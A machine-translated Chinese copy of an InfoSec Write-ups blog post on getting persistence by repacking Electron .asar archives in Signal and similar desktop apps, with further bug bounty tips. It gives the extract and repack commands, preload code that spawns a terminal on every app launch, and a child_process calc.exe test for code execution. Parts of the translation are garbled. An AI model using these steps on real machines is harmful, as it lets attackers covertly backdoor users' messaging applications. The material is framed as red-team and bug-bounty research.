<html>
<head>
<title>Bug Bounty Tips and Getting Persistence With Electron Applications</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Bug Bounty提示和获得电子应用程序的持久性</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/bug-bounty-tips-and-getting-persistence-with-electron-applications-c538d4dda446?source=collection_archive---------1-----------------------#2022-11-22">https://infosecwriteups.com/bug-bounty-tips-and-getting-persistence-with-electron-applications-c538d4dda446?source=collection_archive---------1-----------------------#2022-11-22</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="12e9" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">通过重新打包asar文件、电子应用程序和其他bug赏金提示。主演有《信号》、《不和》、《诺德帕斯》等</h2></div><p id="b5b8" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">对于discord DLL劫持漏洞，我注意到一种新的文件类型，我无法放置<strong class="kh ir"> .asar. </strong>这篇文章解释了asar文件，如何使用它们获得轻松的持久性，以及如何在其中找到其他漏洞。</p><h1 id="8ae2" class="lb lc iq bd ld le lf lg lh li lj lk ll jw lm jx ln jz lo ka lp kc lq kd lr ls bi translated">什么是？asar文件。</h1><p id="55b8" class="pw-post-body-paragraph kf kg iq kh b ki lt jr kk kl lu ju kn ko lv kq kr ks lw ku kv kw lx ky kz la ij bi translated">但首先什么是。asar文件及其用途。下面的GitHub页面给出了一些解释:</p><div class="ly lz gp gr ma mb"><a href="https://github.com/electron/asar" rel="noopener  ugc nofollow" target="_blank"><div class="mc ab fo"><div class="md ab me cl cj mf"><h2 class="bd ir gy z fp mg fr fs mh fu fw ip bi translated">GitHub-electronic/asar:带有索引的简单扩展的类似tar的归档格式</h2><div class="mi l"><h3 class="bd b gy z fp mg fr fs mh fu fw dk translated">带有索引的简单扩展的类似焦油的存档格式</h3></div><div class="mj l"><p class="bd b dl z fp mg fr fs mh fu fw dk translated">github.com</p></div></div><div class="mk l"><div class="ml l mm mn mo mk mp mq mb"/></div></div></a></div><p id="d98a" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这是一种专门用于电子档案的档案格式。可以将您的应用程序打包成这种格式，以后可以用来运行您的电子npm应用程序。</p><p id="8461" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">有趣的是拆包和打包功能。这样就可以打包和解包一个. asar文件，从而检查应用程序。新的攻击方式开始了。</p><h2 id="0ef8" class="mr lc iq bd ld ms mt dn lh mu mv dp ll ko mw mx ln ks my mz lp kw na nb lr nc bi translated">可能的目标</h2><p id="f647" class="pw-post-body-paragraph kf kg iq kh b ki lt jr kk kl lu ju kn ko lv kq kr ks lw ku kv kw lx ky kz la ij bi translated">首先，我开始寻找使用asar文件扩展名的应用程序，其次是discord。我在我的机器上找到了一些:</p><ol class=""><li id="0ef9" class="nd ne iq kh b ki kj kl km ko nf ks ng kw nh la ni nj nk nl bi translated">松弛的</li><li id="c3aa" class="nd ne iq kh b ki nm kl nn ko no ks np kw nq la ni nj nk nl bi translated">组</li><li id="1236" class="nd ne iq kh b ki nm kl nn ko no ks np kw nq la ni nj nk nl bi translated">信号</li><li id="98f8" class="nd ne iq kh b ki nm kl nn ko no ks np kw nq la ni nj nk nl bi translated">诺德帕斯</li><li id="8560" class="nd ne iq kh b ki nm kl nn ko no ks np kw nq la ni nj nk nl bi translated">邮递员</li><li id="359b" class="nd ne iq kh b ki nm kl nn ko no ks np kw nq la ni nj nk nl bi translated">Dropbox</li></ol><p id="8780" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">除了dropbox之外，所有这些文件都位于%Appdata%/local目录中，因此这些文件对于给定用户是可写的。Dropbox将它放在Program Files目录中，这对于普通用户来说更难操作，因此不是真正的目标。</p><p id="3c83" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">因为我已经在我的设备上安装了npm，所以我已经准备好了。在这篇文章中，我将以signal为例，但它适用于所有经过测试的应用。</p><h1 id="8db9" class="lb lc iq bd ld le lf lg lh li lj lk ll jw lm jx ln jz lo ka lp kc lq kd lr ls bi translated">拆包信号。asar文件</h1><p id="7725" class="pw-post-body-paragraph kf kg iq kh b ki lt jr kk kl lu ju kn ko lv kq kr ks lw ku kv kw lx ky kz la ij bi translated">信号的asar文件位于<strong class="kh ir">% APPDATA % \ Local \ Programs \ Signal-desktop \ resources</strong></p><p id="48b7" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在那里，可以运行以下命令来提取app.asar文件，并将其内容写入名为destfolder的文件夹中</p><pre class="nr ns nt nu gt nv nw nx bn ny nz bi"><span id="e52c" class="oa lc iq nw b be ob oc l od oe">npx asar extract app.asar destfolder</span></pre><p id="7107" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如下图所示，这会打开信号应用程序，并显示完整的客户端应用软件。这为多重测试提供了空间。心中第一:坚持。我们能否添加任意代码，重新打包并运行它，而不让应用程序检查错误，或者不让windows defender或Bitdefender收到警报？</p><figure class="nr ns nt nu gt og gh gi paragraph-image"><div role="button" tabindex="0" class="oh oi di oj bf ok"><div class="gh gi of"><img src="../Images/fad49aef604940e15f89ed672364f1b8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UXb02aaHJuh5E25UW7rucA.png"/></div></div></figure><h2 id="bc02" class="mr lc iq bd ld ms mt dn lh mu mv dp ll ko mw mx ln ks my mz lp kw na nb lr nc bi translated">获得持久性</h2><p id="b5d5" class="pw-post-body-paragraph kf kg iq kh b ki lt jr kk kl lu ju kn ko lv kq kr ks lw ku kv kw lx ky kz la ij bi translated">通过快速的谷歌搜索，我找到了某个邪恶电子应用的<a class="ae om" href="https://github.com/parsiya/evil-electron/blob/master/preload.js" rel="noopener ugc nofollow" target="_blank">代码</a>。使用的代码如下所示。</p><pre class="nr ns nt nu gt nv nw nx bn ny nz bi"><span id="15d6" class="oa lc iq nw b be ob oc l od oe">// Detect the operating system.<br/>var platform = require('process').platform;<br/><br/>// Commands<br/>const win32Command = "start cmd.exe";<br/>const darwinCommand = "'/System/Applications/Terminal.app/Contents/MacOS/Terminal',function(){}";<br/>const linuxCommand = "gnome-terminal"; // Issue#2: Find a `universal` Linux command.<br/><br/>var command = "";<br/><br/>console.log(`Running on ${platform}`);<br/><br/>switch (platform) {<br/>    case "win32":<br/>        command = win32Command;<br/>        break;<br/>    case "darwin":<br/>        command = darwinCommand;<br/>        break;<br/>    case "linux":<br/>        command = linuxCommand;<br/>        break;<br/>}<br/><br/>console.log(`Command to be executed: '${command}'`);<br/><br/>if (command === "") {<br/>    console.log(`Operating system '${platform}' is not supported.`);<br/>} else {<br/>    // Spawn a command prompt.<br/>    require('child_process').exec(command);<br/>}</span></pre><p id="b6dc" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">根据受害者使用的操作系统，该应用程序将生成所需的终端。可爱的跨平台执行。</p><p id="7dfb" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在提取的文件夹中，我搜索package.json，它将给出关于应用程序启动功能的信息。</p><figure class="nr ns nt nu gt og gh gi paragraph-image"><div class="gh gi on"><img src="../Images/678d298d8a19f1f8a1966994d58e9ede.png" data-original-src="https://miro.medium.com/v2/resize:fit:1282/format:webp/1*uvfhEdDuKw-jw3WF0eN0xg.png"/></div></figure><p id="99c8" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在Signals实例中，主应用程序位于app/main.js中。<strong class="kh ir">【显示窗口】</strong>函数和上面声明的变量。</p><figure class="nr ns nt nu gt og gh gi paragraph-image"><div role="button" tabindex="0" class="oh oi di oj bf ok"><div class="gh gi oo"><img src="../Images/26ae8922e1330d484e56a8e331f845fd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hqAtqD2psoBfAX3trTXM3w.png"/></div></div></figure><p id="dc40" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">并使用以下命令重新打包已更改的destfolder:</p><pre class="nr ns nt nu gt nv nw nx bn ny nz bi"><span id="a0a2" class="oa lc iq nw b be ob oc l od oe">npx asar pack destfolder app.asar</span></pre><p id="012f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在，每当受害者启动信号，它将启动一个独立于信号的cmd窗口。它也不会是信号进程的子进程，而是一个没有父进程的进程。</p><figure class="nr ns nt nu gt og gh gi paragraph-image"><div class="gh gi op"><img src="../Images/43c75ad142af4c5aec0d58e7ddfa2a79.png" data-original-src="https://miro.medium.com/v2/resize:fit:1276/format:webp/1*L24sYjWYqy-Vu760Is9gqA.png"/></div></figure><p id="8f8e" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">当然，在当前状态下，受害者会发现有一个cmd shell正在启动，应该实施一种更安静的方法。</p><p id="b471" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">即使目标系统上尚未安装npm，也可以使用app.asar的恶意副本来覆盖该应用程序。即使有问题的应用程序已经在使用中！它不会给出任何错误或警告。</p><h2 id="0a94" class="mr lc iq bd ld ms mt dn lh mu mv dp ll ko mw mx ln ks my mz lp kw na nb lr nc bi translated">Bugbounty的其他类型的攻击</h2><p id="f525" class="pw-post-body-paragraph kf kg iq kh b ki lt jr kk kl lu ju kn ko lv kq kr ks lw ku kv kw lx ky kz la ij bi translated">坦率地说，以上攻击更多的是针对持久性，但是应用程序也可以用不同的方法进行测试:</p><p id="d75a" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">要找到秘密，你可以使用下面的单词表</p><p id="add4" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><a class="ae om" href="https://gist.githubusercontent.com/EdOverflow/8bd2faad513626c413b8fc6e9d955669/raw/06a0ef0fd83920d513c65767aae258ecf8382bdf/gistfile1.txt" rel="noopener ugc nofollow" target="_blank">https://gist . githubusercontent . com/EdOverflow/8 BD 2 faad 513626 c 413 b 8 fc 6 e 9d 955669/raw/06 A0 ef 0 FD 83920d 513 c 65767 aae 258 ECF 8382 BDF/gist file 1 . txt</a></p><p id="022f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">对于安全扫描应用程序，可以使用电负性。该应用程序将扫描应用程序的默认错误。【https://github.com/doyensec/electronegativity】T5<br/>T6】</p><p id="6628" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">当然，你也可以尝试启用devtools，拦截流量。这将在下面的文章中详细解释。</p><p id="e139" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><a class="ae om" href="https://blog.doyensec.com/2018/07/19/instrumenting-electron-app.html" rel="noopener ugc nofollow" target="_blank">https://blog . doyensec . com/2018/07/19/instrumenting-electronic-app . html</a>。</p><p id="5fc5" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如果你能打开开发工具。<em class="oq">使用ctrl + shift + i快速检查。</em>您可以在控制台中验证是否可以运行计算过程。如果是这样的话，你离RCE就差一个XSS了。</p><p id="6fa1" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">测试代码:</p><pre class="nr ns nt nu gt nv nw nx bn ny nz bi"><span id="d6df" class="oa lc iq nw b be ob oc l od oe">require('child_process').exec('C:/Windows/System32/calc.exe')</span></pre><p id="0640" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这也可以在代码中进行验证，以检查nodeIntegration是否设置为true。从版本5.0开始，默认情况下这是禁用的，理由很充分！</p><pre class="nr ns nt nu gt nv nw nx bn ny nz bi"><span id="a6ae" class="oa lc iq nw b be ob oc l od oe">webPreferences: {<br/>            nodeIntegration: true<br/>        }</span></pre><p id="56c0" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">利用客户端应用程序的详细信息，还可以检查npm的“依赖性混淆”攻击或其他供应链攻击。Snyk的一个很棒的博客可以在。</p><p id="924c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><a class="ae om" href="https://snyk.io/blog/npm-security-preventing-supply-chain-attacks/" rel="noopener ugc nofollow" target="_blank">https://snyk . io/blog/NPM-安全-预防-供应链-攻击/ </a></p><p id="818e" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">结论</strong></p><p id="e1dd" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">。asar是一种全新的体验，上面提到的技巧可以提供一些简单的持久性。没有哈希验证来验证app.asar在这些大型应用程序中是否发生了更改，因此检测是有限的。坦白说，我觉得很有趣。然而，我还没有用XDR测试它，并期望他们过滤掉这些攻击。攻击媒介只对持久性方法感兴趣。因此，您已经需要访问设备本身来执行这些攻击。</p><p id="372c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">不过为了以防万一，任何红队相关的活动我都会带上攻击方法。</p><p id="b23b" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">希望其他的技巧能帮你找到一些其他的bug。</p><p id="9b67" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如果你想讨论任何与信息安全相关的话题，我在LinkedIn:<a class="ae om" href="https://www.linkedin.com/in/bobvanderstaak/" rel="noopener ugc nofollow" target="_blank">https://www.linkedin.com/in/bobvanderstaak/</a></p></div><div class="ab cl or os hu ot" role="separator"><span class="ou bw bk ov ow ox"/><span class="ou bw bk ov ow ox"/><span class="ou bw bk ov ow"/></div><div class="ij ik il im in"><h2 id="ff3d" class="mr lc iq bd ld ms mt dn lh mu mv dp ll ko mw mx ln ks my mz lp kw na nb lr nc bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae om" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>